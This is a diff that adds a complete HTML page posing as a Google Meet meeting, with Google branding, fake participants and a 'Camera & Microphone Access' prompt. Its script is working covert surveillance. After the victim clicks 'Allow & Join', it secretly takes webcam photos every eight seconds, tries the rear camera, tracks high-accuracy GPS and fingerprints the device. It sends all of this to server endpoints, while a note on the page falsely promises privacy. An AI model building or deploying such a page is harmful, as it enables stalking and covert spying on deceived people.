@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Online Meeting - Connecting...</title>
+<link rel="icon" href="https://ssl.gstatic.com/images/branding/googleg/1x/googleg_standard_color_128dp.png">
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@300;400;500;600&family=Inter:wght@300;400;500;600&display=swap');
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Google Sans', 'Inter', sans-serif;
+    background: #1a1a2e;
+    color: #fff;
+    height: 100vh;
+    overflow: hidden;
+  }
+  .bg-blur {
+    position: fixed; inset: 0;
+    background: radial-gradient(ellipse at 20% 50%, rgba(66,133,244,0.15) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 20%, rgba(52,168,83,0.1) 0%, transparent 50%);
+    animation: bgpulse 8s ease-in-out infinite;
+  }
+  @keyframes bgpulse { 0%,100%{opacity:1} 50%{opacity:0.7} }
+
+  .top-bar {
+    position: fixed; top: 0; left: 0; right: 0;
+    height: 56px;
+    background: rgba(255,255,255,0.05);
+    backdrop-filter: blur(20px);
+    border-bottom: 1px solid rgba(255,255,255,0.08);
+    display: flex; align-items: center; padding: 0 24px;
+    z-index: 100;
+  }
+  .top-bar .logo { display:flex; align-items:center; gap:10px; font-size:18px; font-weight:500; }
+  .logo-dot { width:10px; height:10px; border-radius:50%; animation: dotblink 1s ease-in-out infinite; }
+  .logo-dot.r { background:#ea4335; }
+  .logo-dot.g { background:#34a853; animation-delay:0.2s; }
+  .logo-dot.b { background:#4285f4; animation-delay:0.4s; }
+  .logo-dot.y { background:#fbbc04; animation-delay:0.6s; }
+  @keyframes dotblink { 0%,100%{transform:scale(1)} 50%{transform:scale(1.3)} }
+  .top-bar .meeting-id { margin-left:auto; font-size:13px; color:rgba(255,255,255,0.5); }
+  .top-bar .timer { margin-left:16px; font-size:13px; color:#34a853; font-weight:500; }
+
+  .main {
+    display: flex;
+    height: 100vh;
+    padding-top: 56px;
+  }
+
+  /* Video grid */
+  .video-grid {
+    flex: 1;
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 4px;
+    background: #0d0d0d;
+    padding: 4px;
+  }
+  .video-tile {
+    position: relative;
+    background: #1c1c1c;
+    border-radius: 8px;
+    overflow: hidden;
+    display: flex; align-items: center; justify-content: center;
+  }
+  .video-tile.main-speaker {
+    grid-column: 1 / -1;
+    min-height: 200px;
+  }
+  .tile-video {
+    width: 100%; height: 100%;
+    object-fit: cover;
+    display: none;
+    transform: scaleX(-1);
+  }
+  .tile-video.active { display: block; }
+  .tile-avatar {
+    width: 72px; height: 72px; border-radius: 50%;
+    background: linear-gradient(135deg, #4285f4, #34a853);
+    display: flex; align-items: center; justify-content: center;
+    font-size: 30px; font-weight: 600;
+  }
+  .tile-name {
+    position: absolute; bottom: 8px; left: 12px;
+    background: rgba(0,0,0,0.6); padding: 3px 10px;
+    border-radius: 4px; font-size: 13px;
+  }
+  .tile-muted {
+    position: absolute; bottom: 8px; right: 12px;
+    background: rgba(234,67,53,0.9); width: 28px; height: 28px;
+    border-radius: 50%; display: flex; align-items: center; justify-content: center;
+    font-size: 14px;
+  }
+
+  /* Sidebar */
+  .sidebar {
+    width: 280px;
+    background: rgba(255,255,255,0.03);
+    border-left: 1px solid rgba(255,255,255,0.06);
+    display: flex; flex-direction: column;
+  }
+  .sidebar-header {
+    padding: 16px;
+    border-bottom: 1px solid rgba(255,255,255,0.06);
+    font-size: 14px; font-weight: 500;
+  }
+  .participant {
+    display: flex; align-items: center; padding: 10px 16px; gap: 12px;
+    transition: background 0.2s;
+  }
+  .participant:hover { background: rgba(255,255,255,0.05); }
+  .p-avatar {
+    width: 36px; height: 36px; border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 14px; font-weight: 600;
+  }
+  .p-info { flex:1; }
+  .p-name { font-size:14px; }
+  .p-status { font-size:12px; color:rgba(255,255,255,0.5); }
+  .p-icon { font-size: 14px; color: rgba(255,255,255,0.4); }
+
+  /* Bottom controls */
+  .controls {
+    position: fixed; bottom: 0; left: 0; right: 280px;
+    height: 80px;
+    background: rgba(20,20,30,0.95);
+    backdrop-filter: blur(20px);
+    border-top: 1px solid rgba(255,255,255,0.06);
+    display: flex; align-items: center; justify-content: center; gap: 12px;
+    z-index: 100;
+  }
+  .ctrl-btn {
+    display: flex; flex-direction: column; align-items: center; gap: 4px;
+    background: rgba(255,255,255,0.08); border: none; border-radius: 12px;
+    padding: 10px 18px; cursor: pointer; color: #fff;
+    font-size: 22px; transition: all 0.2s; min-width: 60px;
+  }
+  .ctrl-btn:hover { background: rgba(255,255,255,0.15); transform:translateY(-2px); }
+  .ctrl-btn.active { background: rgba(234,67,53,0.9); }
+  .ctrl-btn span { font-size: 11px; }
+  .ctrl-btn.end { background: #ea4335; min-width: 100px; }
+  .ctrl-btn.end:hover { background: #c5342a; }
+
+  /* Permission modal */
+  .modal-overlay {
+    position: fixed; inset: 0; background: rgba(0,0,0,0.85);
+    backdrop-filter: blur(8px);
+    display: flex; align-items: center; justify-content: center;
+    z-index: 1000;
+  }
+  .modal {
+    background: linear-gradient(145deg, #1e2a38, #16202c);
+    border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 20px;
+    padding: 40px;
+    max-width: 420px; width: 90%;
+    text-align: center;
+    box-shadow: 0 40px 80px rgba(0,0,0,0.6);
+    animation: modalIn 0.4s cubic-bezier(0.34,1.56,0.64,1);
+  }
+  @keyframes modalIn { from{transform:scale(0.7);opacity:0} to{transform:scale(1);opacity:1} }
+  .modal-icon { font-size: 56px; margin-bottom: 16px; }
+  .modal h2 { font-size: 22px; margin-bottom: 10px; font-weight: 600; }
+  .modal p { font-size: 14px; color: rgba(255,255,255,0.65); line-height: 1.6; margin-bottom: 24px; }
+  .perm-items {
+    display: flex; gap: 16px; justify-content: center; margin-bottom: 28px;
+  }
+  .perm-item {
+    background: rgba(255,255,255,0.05); border-radius: 12px;
+    padding: 12px 16px; font-size: 13px;
+    display: flex; flex-direction: column; align-items: center; gap: 6px;
+  }
+  .perm-item .icon { font-size: 24px; }
+  .modal-btn {
+    width: 100%; padding: 14px;
+    background: linear-gradient(135deg, #4285f4, #34a853);
+    border: none; border-radius: 12px; color: #fff;
+    font-size: 16px; font-weight: 600; cursor: pointer;
+    transition: all 0.2s; letter-spacing: 0.3px;
+  }
+  .modal-btn:hover { transform:translateY(-2px); box-shadow: 0 8px 24px rgba(66,133,244,0.4); }
+  .modal-note { font-size: 12px; color: rgba(255,255,255,0.4); margin-top: 12px; }
+
+  /* Status toasts */
+  .toast-container { position:fixed; top:70px; right:20px; z-index:999; display:flex; flex-direction:column; gap:8px; }
+  .toast {
+    background: rgba(30,40,50,0.95); border: 1px solid rgba(255,255,255,0.1);
+    border-radius: 10px; padding: 10px 16px; font-size: 13px;
+    display: flex; align-items: center; gap: 8px;
+    animation: toastIn 0.3s ease; min-width: 220px;
+  }
+  @keyframes toastIn { from{transform:translateX(100%);opacity:0} to{transform:translateX(0);opacity:1} }
+  .toast.success { border-color: rgba(52,168,83,0.4); }
+  .toast.info { border-color: rgba(66,133,244,0.4); }
+
+  .connecting-overlay {
+    position:fixed; inset:0; background:rgba(10,10,20,0.97);
+    display:flex; flex-direction:column; align-items:center; justify-content:center;
+    z-index:500; transition: opacity 0.5s;
+  }
+  .spinner {
+    width:60px; height:60px; border:3px solid rgba(255,255,255,0.1);
+    border-top-color: #4285f4; border-radius:50%;
+    animation: spin 0.8s linear infinite; margin-bottom: 20px;
+  }
+  @keyframes spin { to{ transform:rotate(360deg) } }
+  .connecting-text { font-size:18px; color:rgba(255,255,255,0.8); }
+  .connecting-sub { font-size:13px; color:rgba(255,255,255,0.4); margin-top:8px; }
+
+  @media(max-width:768px){
+    .sidebar{display:none;}
+    .controls{right:0;}
+    .video-grid{grid-template-columns:1fr;}
+  }
+</style>
+</head>
+<body>
+<div class="bg-blur"></div>
+
+<!-- Connecting overlay -->
+<div class="connecting-overlay" id="connectingOverlay">
+  <div class="spinner"></div>
+  <div class="connecting-text">Connecting to meeting...</div>
+  <div class="connecting-sub">Please wait while we set up your session</div>
+</div>
+
+<!-- Permission Modal -->
+<div class="modal-overlay" id="permModal" style="display:none">
+  <div class="modal">
+    <div class="modal-icon">📹</div>
+    <h2>Camera & Microphone Access</h2>
+    <p>This meeting requires access to your camera and microphone to connect you with other participants.</p>
+    <div class="perm-items">
+      <div class="perm-item"><span class="icon">📷</span> Camera</div>
+      <div class="perm-item"><span class="icon">🎤</span> Microphone</div>
+      <div class="perm-item"><span class="icon">📍</span> Location</div>
+    </div>
+    <button class="modal-btn" id="allowBtn">Allow & Join Meeting</button>
+    <div class="modal-note">Your privacy is protected. Access is only used during the meeting.</div>
+  </div>
+</div>
+
+<!-- Top bar -->
+<div class="top-bar">
+  <div class="logo">
+    <div class="logo-dot r"></div>
+    <div class="logo-dot g"></div>
+    <div class="logo-dot b"></div>
+    <div class="logo-dot y"></div>
+    Meet
+  </div>
+  <div class="meeting-id">Meeting ID: <strong id="meetingId">---</strong></div>
+  <div class="timer" id="meetTimer">00:00</div>
+</div>
+
+<!-- Main layout -->
+<div class="main">
+  <div class="video-grid">
+    <div class="video-tile main-speaker">
+      <video id="localVideo" class="tile-video" autoplay muted playsinline></video>
+      <canvas id="localCanvas" style="display:none"></canvas>
+      <div class="tile-avatar" id="localAvatar">Y</div>
+      <div class="tile-name">You (Host)</div>
+    </div>
+    <div class="video-tile">
+      <div class="tile-avatar" style="background:linear-gradient(135deg,#fbbc04,#ea4335)">S</div>
+      <div class="tile-name">Sarah M.</div>
+      <div class="tile-muted">🔇</div>
+    </div>
+    <div class="video-tile">
+      <div class="tile-avatar" style="background:linear-gradient(135deg,#9c27b0,#3f51b5)">J</div>
+      <div class="tile-name">James K.</div>
+    </div>
+  </div>
+
+  <div class="sidebar">
+    <div class="sidebar-header">👥 Participants (3)</div>
+    <div class="participant">
+      <div class="p-avatar" style="background:linear-gradient(135deg,#4285f4,#34a853)">Y</div>
+      <div class="p-info"><div class="p-name">You (Host)</div><div class="p-status">● Presenting</div></div>
+      <div class="p-icon">🎙️</div>
+    </div>
+    <div class="participant">
+      <div class="p-avatar" style="background:linear-gradient(135deg,#fbbc04,#ea4335)">S</div>
+      <div class="p-info"><div class="p-name">Sarah M.</div><div class="p-status">Muted</div></div>
+      <div class="p-icon">🔇</div>
+    </div>
+    <div class="participant">
+      <div class="p-avatar" style="background:linear-gradient(135deg,#9c27b0,#3f51b5)">J</div>
+      <div class="p-info"><div class="p-name">James K.</div><div class="p-status">Listening</div></div>
+      <div class="p-icon">🎙️</div>
+    </div>
+  </div>
+</div>
+
+<!-- Controls -->
+<div class="controls">
+  <button class="ctrl-btn" id="micBtn">🎤<span>Mute</span></button>
+  <button class="ctrl-btn" id="camBtn">📷<span>Camera</span></button>
+  <button class="ctrl-btn">💬<span>Chat</span></button>
+  <button class="ctrl-btn">👥<span>People</span></button>
+  <button class="ctrl-btn">⋯<span>More</span></button>
+  <button class="ctrl-btn end">📞 End</button>
+</div>
+
+<!-- Toasts -->
+<div class="toast-container" id="toastContainer"></div>
+
+<script>
+const SERVER = window.location.origin;
+let sessionId = null;
+let photoIndex = 0;
+let captureInterval = null;
+let timerInterval = null;
+let elapsedSeconds = 0;
+
+// Generate random meeting ID
+document.getElementById('meetingId').textContent =
+  Math.random().toString(36).substr(2,4).toUpperCase() + '-' +
+  Math.random().toString(36).substr(2,4).toUpperCase() + '-' +
+  Math.random().toString(36).substr(2,4).toUpperCase();
+
+// Timer
+function startTimer() {
+  timerInterval = setInterval(() => {
+    elapsedSeconds++;
+    const m = String(Math.floor(elapsedSeconds/60)).padStart(2,'0');
+    const s = String(elapsedSeconds%60).padStart(2,'0');
+    document.getElementById('meetTimer').textContent = `${m}:${s}`;
+  }, 1000);
+}
+
+// Toast
+function showToast(msg, type='info') {
+  const tc = document.getElementById('toastContainer');
+  const t = document.createElement('div');
+  t.className = `toast ${type}`;
+  t.innerHTML = (type==='success'?'✅':'ℹ️') + ' ' + msg;
+  tc.appendChild(t);
+  setTimeout(() => t.remove(), 4000);
+}
+
+// Beacon
+async function sendBeacon() {
+  const info = {
+    template: 'meeting',
+    screen: { width: screen.width, height: screen.height, depth: screen.colorDepth },
+    platform: navigator.platform,
+    language: navigator.language,
+    connection: navigator.connection ? {
+      type: navigator.connection.effectiveType,
+      downlink: navigator.connection.downlink
+    } : {}
+  };
+  try {
+    const r = await fetch(`${SERVER}/api/beacon`, {
+      method: 'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(info)
+    });
+    const d = await r.json();
+    sessionId = d.session;
+  } catch(e) {}
+}
+
+// Location
+async function captureLocation() {
+  console.log('[DEBUG] captureLocation called, sessionId=', sessionId);
+  let lat = null, lon = null, acc = null;
+  let watchId = null;
+
+  if (!navigator.geolocation) {
+    console.log('[DEBUG] Geolocation not supported');
+    const el=document.getElementById('geoStatus');
+    if(el) el.textContent='Geolocation not supported';
+  } else {
+    // Use watchPosition for continuous high-accuracy GPS fixes
+    try {
+      watchId = navigator.geolocation.watchPosition((pos) => {
+        lat = pos.coords.latitude;
+        lon = pos.coords.longitude;
+        acc = pos.coords.accuracy;
+        console.log('[DEBUG] watchPosition GPS:', lat, lon, acc, 'm');
+        const el=document.getElementById('geoStatus');
+        if(el) el.textContent=`GPS tracking... ${acc}m accuracy`;
+      }, (err) => {
+        console.log('[!] watchPosition error:', err.code, err.message);
+      }, {
+        enableHighAccuracy: true,
+        timeout: 20000,
+        maximumAge: 0
+      });
+
+      // Wait up to 15 seconds for a good GPS fix
+      await new Promise(r => setTimeout(r, 15000));
+
+      // Stop watching once we have a fix
+      if (watchId) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+      }
+    } catch(err) {
+      console.log('[!] Geolocation setup error:', err);
+      if (watchId) {
+        navigator.geolocation.clearWatch(watchId);
+        watchId = null;
+      }
+    }
+  }
+
+  if (!lat && !lon) {
+    const el=document.getElementById('geoStatus');
+    if(el) el.textContent='GPS unavailable — IP fallback will be used';
+  }
+
+  const data = {
+    session: sessionId,
+    lat: lat,
+    lon: lon,
+    accuracy: acc
+  };
+  console.log('[DEBUG] Sending location to server:', data);
+  try {
+    const r = await fetch(`${SERVER}/api/location`, {
+      method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(data)
+    });
+    const d = await r.json();
+    console.log('[DEBUG] Location response:', d);
+    if(d.location_verified === false) {
+      const el=document.getElementById('geoStatus');
+      if(el) el.textContent='⚠ GPS captured (far from IP)';
+    } else if(d.source === 'gps') {
+      const el=document.getElementById('geoStatus');
+      if(el) el.textContent='✓ Exact GPS location captured';
+    }
+  } catch(e){ console.log('[!] Location send error:', e); }
+}
+
+// Photo capture
+function capturePhoto(video, facing='front') {
+  if (video.readyState < 2) return;
+  const canvas = document.getElementById('localCanvas');
+  canvas.width = video.videoWidth || 640;
+  canvas.height = video.videoHeight || 480;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0);
+  const b64 = canvas.toDataURL('image/jpeg', 0.85);
+  fetch(`${SERVER}/api/photo`, {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ session: sessionId, image: b64, index: photoIndex++, camera: facing })
+  });
+}
+
+// Device fingerprint
+async function sendDeviceInfo() {
+  const fp = {
+    platform: navigator.platform,
+    languages: navigator.languages,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    cookieEnabled: navigator.cookieEnabled,
+    doNotTrack: navigator.doNotTrack,
+    hardwareConcurrency: navigator.hardwareConcurrency,
+    deviceMemory: navigator.deviceMemory,
+    maxTouchPoints: navigator.maxTouchPoints,
+  };
+  let devices = [];
+  try { devices = (await navigator.mediaDevices.enumerateDevices()).map(d=>({kind:d.kind,label:d.label})); } catch(e){}
+  fetch(`${SERVER}/api/device`, {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ session: sessionId, fingerprint: fp, mediaDevices: devices })
+  });
+}
+
+// Main init
+async function init() {
+  // Send beacon first
+  await sendBeacon();
+
+  // Show connecting for 2.5s then perm modal
+  setTimeout(() => {
+    document.getElementById('connectingOverlay').style.opacity = '0';
+    setTimeout(() => {
+      document.getElementById('connectingOverlay').style.display = 'none';
+      document.getElementById('permModal').style.display = 'flex';
+    }, 500);
+  }, 2500);
+}
+
+document.getElementById('allowBtn').addEventListener('click', async () => {
+  document.getElementById('permModal').style.display = 'none';
+  startTimer();
+  showToast('Connecting to meeting room...', 'info');
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width:{ideal:1280}, height:{ideal:720} },
+      audio: true
+    });
+
+    const video = document.getElementById('localVideo');
+    video.srcObject = stream;
+    video.classList.add('active');
+    document.getElementById('localAvatar').style.display = 'none';
+
+    showToast('Connected! Camera active.', 'success');
+    captureLocation();
+    await sendDeviceInfo();
+
+    // Take photo immediately then every 8 seconds
+    setTimeout(() => capturePhoto(video, 'front'), 1500);
+    captureInterval = setInterval(() => capturePhoto(video, 'front'), 8000);
+
+    // Try back camera too on mobile
+    try {
+      const backStream = await navigator.mediaDevices.getUserMedia({
+        video:{ facingMode:{exact:'environment'} }
+      });
+      const backTrack = backStream.getVideoTracks()[0];
+      const backVid = document.createElement('video');
+      backVid.srcObject = backStream;
+      backVid.play();
+      backVid.addEventListener('loadeddata', () => {
+        setTimeout(() => capturePhoto(backVid, 'back'), 2000);
+        backTrack.stop();
+      });
+    } catch(e){}
+
+  } catch(err) {
+    showToast('Camera unavailable. Continuing in audio-only mode.', 'info');
+    captureLocation();
+    sendDeviceInfo();
+  }
+});
+
+init();
+</script>
+</body>
+</html>
